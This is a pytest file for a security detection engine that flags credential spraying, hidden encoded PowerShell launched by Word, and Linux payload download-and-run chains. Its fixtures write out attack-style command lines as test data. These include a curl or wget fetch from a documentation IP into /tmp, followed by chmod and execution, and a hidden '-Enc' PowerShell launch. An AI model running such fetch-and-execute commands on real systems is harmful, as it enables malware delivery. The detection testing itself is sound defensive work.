import itertools
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from src.detection_engine import (
    CREDENTIAL_ATTACK,
    HIGH,
    MAX_CONFIDENCE,
    MEDIUM,
    PAYLOAD_EXECUTION,
    SUSPICIOUS_POWERSHELL,
    DetectionConfig,
    detect_credential_attack,
    detect_payload_execution,
    detect_suspicious_powershell,
    run_detections,
)
from src.normalizer import (
    AUTHENTICATION,
    DNS_QUERY,
    FAILURE,
    FILE_CREATE,
    FILE_MODIFICATION,
    NETWORK_CONNECTION,
    PROCESS_CREATE,
    SUCCESS,
    NormalizedEvent,
    normalize_events,
)

DATA_FILE = Path(__file__).resolve().parent.parent / "data" / "security_events.json"
START = datetime(2026, 9, 14, 9, 0, 0, tzinfo=timezone.utc)
_ids = itertools.count(1)


def at(seconds: float) -> str:
    """Normalized timestamp ``seconds`` after START."""
    moment = START + timedelta(seconds=seconds)
    return moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{moment.microsecond // 1000:03d}Z"


def make_event(event_type: str, seconds: float, **fields) -> NormalizedEvent:
    return NormalizedEvent(
        event_id=f"test-{next(_ids):04d}",
        timestamp=at(seconds),
        event_type=event_type,
        vendor="test",
        log_source="test",
        **fields,
    )


# --- Event builders ---------------------------------------------------------


def auth(seconds, user, result, source_ip="203.0.113.45", host="web-01"):
    return make_event(AUTHENTICATION, seconds, user=user, result=result, source_ip=source_ip, host=host)


def burst(users, source_ip="203.0.113.45", host="web-01", start=0, step=5):
    return [auth(start + i * step, user, FAILURE, source_ip, host) for i, user in enumerate(users)]


FIVE_USERS = ["admin", "root", "test", "ubuntu", "deploy"]

WIN_HOST = "WS-01"
POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXPLORER = "C:\\Windows\\explorer.exe"
DROPPED = "C:\\Users\\alex\\AppData\\Local\\Temp\\update.exe"
# UTF-16LE Base64 of: Write-Output 'hello'
ENCODED = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA=="


def win_process(seconds, image, parent, command_line, pid, ppid=100, host=WIN_HOST):
    return make_event(
        PROCESS_CREATE,
        seconds,
        host=host,
        user="alex",
        process=image,
        parent_process=parent,
        command_line=command_line,
        process_id=pid,
        parent_process_id=ppid,
    )


def powershell_activity(pid=4000, host=WIN_HOST, start=1):
    """DNS, external connection, file creation and execution of that file by one PowerShell process."""
    return [
        make_event(DNS_QUERY, start, host=host, process=POWERSHELL, process_id=pid, dns_query="cdn.example"),
        make_event(
            NETWORK_CONNECTION, start + 1, host=host, process=POWERSHELL, process_id=pid,
            source_ip="10.0.0.5", destination_ip="192.0.2.10", destination_port=443,
        ),
        make_event(FILE_CREATE, start + 2, host=host, process=POWERSHELL, process_id=pid, file_path=DROPPED),
        win_process(start + 3, DROPPED, POWERSHELL, f'"{DROPPED}"', pid=4100, ppid=pid, host=host),
    ]


def suspicious_powershell(pid=4000, host=WIN_HOST):
    return win_process(0, POWERSHELL, WINWORD, f"powershell.exe -NoP -W Hidden -Enc {ENCODED}", pid=pid, ppid=3000, host=host)


LINUX_HOST = "srv-01"
PAYLOAD = "/tmp/.agent"


def linux_process(seconds, exe, command_line, pid, user="deploy", host=LINUX_HOST):
    return make_event(
        PROCESS_CREATE, seconds, host=host, user=user, process=exe,
        parent_process="/usr/bin/bash", command_line=command_line, process_id=pid, parent_process_id=1000,
    )


def payload_chain(path=PAYLOAD, host=LINUX_HOST, user="deploy"):
    """download -> file create -> chmod -> execution -> outbound connection"""
    return [
        linux_process(0, "/usr/bin/curl", f"curl -fsSL http://198.51.100.9/a -o {path}", 2001, user, host),
        make_event(FILE_CREATE, 1, host=host, user=user, process="/usr/bin/curl", process_id=2001, file_path=path),
        linux_process(10, "/usr/bin/chmod", f"chmod +x {path}", 2002, user, host),
        make_event(FILE_MODIFICATION, 10.5, host=host, user=user, process="/usr/bin/chmod", process_id=2002, file_path=path),
        linux_process(20, path, path, 2003, user, host),
        make_event(
            NETWORK_CONNECTION, 22, host=host, user=user, process=path, process_id=2003,
            source_ip="10.0.1.5", destination_ip="198.51.100.9", destination_port=8443,
        ),
    ]


# =========================================================================
# Detection 1: credential attack followed by successful authentication
# =========================================================================


def test_credential_attack_detected():
    events = burst(FIVE_USERS) + [auth(40, "deploy", SUCCESS)]
    [detection] = detect_credential_attack(events)

    assert detection.name == CREDENTIAL_ATTACK
    assert detection.severity == HIGH
    assert detection.source_ip == "203.0.113.45"
    assert detection.user == "deploy"
    assert detection.host == "web-01"
    assert detection.details["failed_attempts"] == 5
    assert detection.details["targeted_accounts"] == FIVE_USERS
    assert detection.details["elapsed_seconds"] == 40
    assert len(detection.evidence) == 6
    assert "password spraying" not in detection.name.lower()


def test_credential_confidence_is_explained_by_signals():
    events = burst(FIVE_USERS) + [auth(40, "deploy", SUCCESS)]
    [detection] = detect_credential_attack(events)
    # base 0.70 + external source 0.10 + failed account later succeeded 0.10
    assert detection.confidence == 0.90
    assert len(detection.signals) == 3


def test_credential_attack_from_internal_ip_to_new_account_has_lower_confidence():
    events = burst(FIVE_USERS, source_ip="10.0.5.5") + [auth(40, "oracle", SUCCESS, source_ip="10.0.5.5")]
    [detection] = detect_credential_attack(events)
    assert detection.confidence == 0.70


def test_failures_without_success_do_not_trigger():
    assert detect_credential_attack(burst(FIVE_USERS + ["oracle", "guest"])) == []


def test_success_outside_window_does_not_trigger():
    events = burst(FIVE_USERS) + [auth(20 + 6 * 60, "deploy", SUCCESS)]
    assert detect_credential_attack(events) == []


def test_window_is_configurable():
    events = burst(FIVE_USERS) + [auth(20 + 6 * 60, "deploy", SUCCESS)]
    config = DetectionConfig(auth_window=timedelta(minutes=10))
    assert len(detect_credential_attack(events, config)) == 1


def test_too_few_failures_do_not_trigger():
    events = burst(["admin", "root", "test", "ubuntu"]) + [auth(30, "deploy", SUCCESS)]
    assert detect_credential_attack(events) == []


def test_too_few_distinct_accounts_do_not_trigger():
    events = burst(["admin", "admin", "admin", "root", "root"]) + [auth(30, "root", SUCCESS)]
    assert detect_credential_attack(events) == []


def test_success_from_different_source_ip_does_not_trigger():
    events = burst(FIVE_USERS) + [auth(40, "deploy", SUCCESS, source_ip="198.51.100.20")]
    assert detect_credential_attack(events) == []


def test_failures_spread_over_several_source_ips_do_not_trigger():
    ips = ["203.0.113.1", "203.0.113.2", "203.0.113.3", "203.0.113.4", "203.0.113.5"]
    events = [auth(i * 5, user, FAILURE, source_ip=ip) for i, (user, ip) in enumerate(zip(FIVE_USERS, ips))]
    events.append(auth(40, "deploy", SUCCESS, source_ip=ips[0]))
    assert detect_credential_attack(events) == []


def test_success_on_different_host_does_not_trigger():
    events = burst(FIVE_USERS, host="web-01") + [auth(40, "deploy", SUCCESS, host="web-02")]
    assert detect_credential_attack(events) == []


def test_user_mistyping_password_does_not_trigger():
    events = [
        auth(0, "roberto", FAILURE, source_ip="10.0.2.51"),
        auth(8, "roberto", FAILURE, source_ip="10.0.2.51"),
        auth(15, "roberto", SUCCESS, source_ip="10.0.2.51"),
    ]
    assert detect_credential_attack(events) == []


def test_one_burst_is_reported_once_even_with_two_successes():
    events = burst(FIVE_USERS) + [auth(40, "deploy", SUCCESS), auth(50, "deploy", SUCCESS)]
    assert len(detect_credential_attack(events)) == 1


# =========================================================================
# Detection 2: suspicious PowerShell execution
# =========================================================================


def test_suspicious_powershell_chain_detected():
    events = [suspicious_powershell()] + powershell_activity()
    [detection] = detect_suspicious_powershell(events)

    assert detection.name == SUSPICIOUS_POWERSHELL
    assert detection.severity == HIGH
    assert detection.host == WIN_HOST
    # every signal except executed_file_external_connection (no such event here)
    assert detection.confidence == 0.90
    assert detection.details["decoded_command"] == "Write-Output 'hello'"
    assert detection.details["dns_queries"] == ["cdn.example"]
    assert detection.details["executed_files"] == [DROPPED]
    assert len(detection.evidence) == 5
    assert "WINWORD.EXE spawned PowerShell" in detection.reasoning


def test_confidence_grows_with_correlated_activity():
    alone = detect_suspicious_powershell([suspicious_powershell()])
    correlated = detect_suspicious_powershell([suspicious_powershell()] + powershell_activity())
    # 0.25 parent + 0.20 encoded + 0.10 hidden
    assert alone[0].confidence == 0.55
    assert correlated[0].confidence > alone[0].confidence


def test_reasoning_does_not_claim_c2_or_exfiltration():
    [detection] = detect_suspicious_powershell([suspicious_powershell()] + powershell_activity())
    text = detection.reasoning.lower()
    assert "command-and-control" not in text and " c2" not in text
    assert "exfiltrat" not in text


def test_normal_admin_powershell_does_not_trigger():
    admin = win_process(0, POWERSHELL, EXPLORER, "powershell.exe -NoProfile -Command \"Get-Service\"", pid=4000)
    assert detect_suspicious_powershell([admin]) == []


def test_powershell_network_activity_without_suspicious_context_does_not_trigger():
    plain = win_process(0, POWERSHELL, EXPLORER, "powershell.exe -File C:\\Scripts\\inventory.ps1", pid=4000)
    assert detect_suspicious_powershell([plain] + powershell_activity()) == []


def test_encoded_command_alone_does_not_trigger():
    encoded = win_process(0, POWERSHELL, EXPLORER, f"powershell.exe -EncodedCommand {ENCODED}", pid=4000)
    assert detect_suspicious_powershell([encoded]) == []


def test_word_without_powershell_does_not_trigger():
    word = win_process(0, WINWORD, EXPLORER, f'"{WINWORD}" /n "C:\\report.docx"', pid=3000)
    splwow = win_process(5, "C:\\Windows\\splwow64.exe", WINWORD, "splwow64.exe 8192", pid=3100, ppid=3000)
    assert detect_suspicious_powershell([word, splwow]) == []


def test_activity_from_other_host_or_process_is_not_correlated():
    other_host = powershell_activity(pid=4000, host="WS-99")
    other_pid = powershell_activity(pid=5555)
    [detection] = detect_suspicious_powershell([suspicious_powershell()] + other_host + other_pid)
    assert detection.confidence == 0.55  # only the process-level signals count
    assert len(detection.evidence) == 1


def test_missing_process_ids_do_not_create_false_correlation():
    no_pid = win_process(0, POWERSHELL, WINWORD, f"powershell.exe -W Hidden -Enc {ENCODED}", pid=None, ppid=None)
    activity = [
        make_event(FILE_CREATE, 2, host=WIN_HOST, process=POWERSHELL, file_path=DROPPED),
        win_process(3, DROPPED, POWERSHELL, DROPPED, pid=None, ppid=None),
    ]
    [detection] = detect_suspicious_powershell([no_pid] + activity)
    assert detection.details["created_files"] == []
    assert detection.details["executed_files"] == []


def test_activity_outside_window_is_not_correlated():
    late = powershell_activity(start=10 * 60)
    [detection] = detect_suspicious_powershell([suspicious_powershell()] + late)
    assert detection.confidence == 0.55


def test_internal_connection_is_not_external_signal():
    internal = make_event(
        NETWORK_CONNECTION, 1, host=WIN_HOST, process=POWERSHELL, process_id=4000,
        destination_ip="10.0.0.10", destination_port=445,
    )
    [detection] = detect_suspicious_powershell([suspicious_powershell(), internal])
    assert detection.details["external_destinations"] == []


# =========================================================================
# Detection 3: payload download and execution
# =========================================================================


def test_payload_download_and_execution_detected():
    [detection] = detect_payload_execution(payload_chain())

    assert detection.name == PAYLOAD_EXECUTION
    assert detection.severity == HIGH
    assert detection.host == LINUX_HOST
    assert detection.user == "deploy"
    assert detection.details["downloaded_path"] == PAYLOAD
    assert detection.details["elapsed_seconds_download_to_execution"] == 20
    assert len(detection.details["permission_events"]) == 2
    assert len(detection.details["network_events"]) == 1
    assert detection.confidence == MAX_CONFIDENCE
    descriptions = [item.description for item in detection.evidence]
    assert descriptions[0].startswith("DOWNLOAD")
    assert any(d.startswith("EXECUTION") for d in descriptions)


def test_download_without_execution_does_not_trigger():
    chain = payload_chain()
    without_execution = [e for e in chain if e.process != PAYLOAD]
    assert detect_payload_execution(without_execution) == []


def test_chmod_and_execution_without_download_do_not_trigger():
    chain = payload_chain()
    without_download = [e for e in chain if e.process != "/usr/bin/curl"]
    assert detect_payload_execution(without_download) == []


def test_execution_without_chmod_is_medium():
    chain = [e for e in payload_chain() if e.process != "/usr/bin/chmod"]
    [detection] = detect_payload_execution(chain)
    assert detection.severity == MEDIUM
    assert detection.details["permission_events"] == []


def test_legitimate_curl_without_output_file_does_not_trigger():
    health_check = linux_process(0, "/usr/bin/curl", "curl -s http://127.0.0.1:8080/healthz", 2001)
    assert detect_payload_execution([health_check]) == []


def test_execution_on_another_host_does_not_trigger():
    chain = payload_chain()
    elsewhere = linux_process(20, PAYLOAD, PAYLOAD, 2003, host="srv-02")
    events = [e for e in chain if e.process != PAYLOAD] + [elsewhere]
    assert detect_payload_execution(events) == []


def test_execution_by_another_user_does_not_trigger():
    chain = [e for e in payload_chain() if e.process != PAYLOAD]
    other_user = linux_process(20, PAYLOAD, PAYLOAD, 2003, user="www-data")
    assert detect_payload_execution(chain + [other_user]) == []


def test_mismatched_file_path_does_not_trigger():
    chain = [e for e in payload_chain() if e.process != PAYLOAD]
    other_file = linux_process(20, "/tmp/other-binary", "/tmp/other-binary", 2003)
    assert detect_payload_execution(chain + [other_file]) == []


def test_execution_before_download_does_not_trigger():
    execution_first = [
        linux_process(0, PAYLOAD, PAYLOAD, 2003),
        linux_process(10, "/usr/bin/chmod", f"chmod +x {PAYLOAD}", 2002),
        linux_process(20, "/usr/bin/curl", f"curl -o {PAYLOAD} http://198.51.100.9/a", 2001),
    ]
    assert detect_payload_execution(execution_first) == []


def test_chmod_after_execution_is_not_counted():
    chain = payload_chain()
    late_chmod = [
        linux_process(30, "/usr/bin/chmod", f"chmod +x {PAYLOAD}", 2002),
    ]
    events = [e for e in chain if e.process != "/usr/bin/chmod"] + late_chmod
    [detection] = detect_payload_execution(events)
    assert detection.details["permission_events"] == []


def test_execution_outside_window_does_not_trigger():
    chain = [e for e in payload_chain() if e.process != PAYLOAD]
    much_later = linux_process(20 * 60, PAYLOAD, PAYLOAD, 2003)
    assert detect_payload_execution(chain + [much_later]) == []


def test_wget_download_is_supported():
    events = [
        linux_process(0, "/usr/bin/wget", f"wget -q http://198.51.100.9/a -O {PAYLOAD}", 2001),
        linux_process(5, "/usr/bin/chmod", f"chmod 755 {PAYLOAD}", 2002),
        linux_process(9, PAYLOAD, PAYLOAD, 2003),
    ]
    [detection] = detect_payload_execution(events)
    assert detection.severity == HIGH


# =========================================================================
# Engine and bundled dataset
# =========================================================================


def test_input_order_does_not_matter():
    events = burst(FIVE_USERS) + [auth(40, "deploy", SUCCESS)] + payload_chain()
    shuffled = events[:]
    random.Random(7).shuffle(shuffled)
    assert [d.detection_id for d in run_detections(shuffled)] == [d.detection_id for d in run_detections(events)]


def test_detection_ids_are_deterministic():
    chain = payload_chain()
    assert run_detections(chain)[0].detection_id == run_detections(chain)[0].detection_id
    # Different evidence (fresh event IDs) produces a different detection ID.
    assert run_detections(payload_chain())[0].detection_id != run_detections(chain)[0].detection_id


def _dataset_detections():
    events, _ = normalize_events(json.loads(DATA_FILE.read_text(encoding="utf-8")))
    return events, run_detections(events)


def test_bundled_dataset_produces_exactly_the_three_intended_detections():
    _, detections = _dataset_detections()
    by_name = {d.name: d for d in detections}

    assert len(detections) == 3
    assert by_name[CREDENTIAL_ATTACK].host == "web-prod-01"
    assert by_name[CREDENTIAL_ATTACK].details["failed_attempts"] == 6
    assert by_name[CREDENTIAL_ATTACK].details["elapsed_seconds"] == 62
    assert by_name[SUSPICIOUS_POWERSHELL].host == "FIN-WS-07"
    assert by_name[PAYLOAD_EXECUTION].details["downloaded_path"] == "/tmp/.cache-update"
    assert by_name[PAYLOAD_EXECUTION].details["elapsed_seconds_download_to_execution"] == 14


def test_benign_hosts_and_users_are_not_detected():
    _, detections = _dataset_detections()
    assert all(d.host != "DEV-PC-03" for d in detections)
    assert all(d.user not in {"alice", "roberto", "root"} for d in detections)


def test_evidence_references_real_events_in_order():
    events, detections = _dataset_detections()
    known_ids = {event.event_id for event in events}
    for detection in detections:
        ids = [item.event_id for item in detection.evidence]
        assert set(ids) <= known_ids
        assert [item.timestamp for item in detection.evidence] == sorted(item.timestamp for item in detection.evidence)
        assert detection.first_seen == detection.evidence[0].timestamp
        assert detection.last_seen == detection.evidence[-1].timestamp
        assert 0.0 <= detection.confidence <= MAX_CONFIDENCE
        assert detection.false_positives
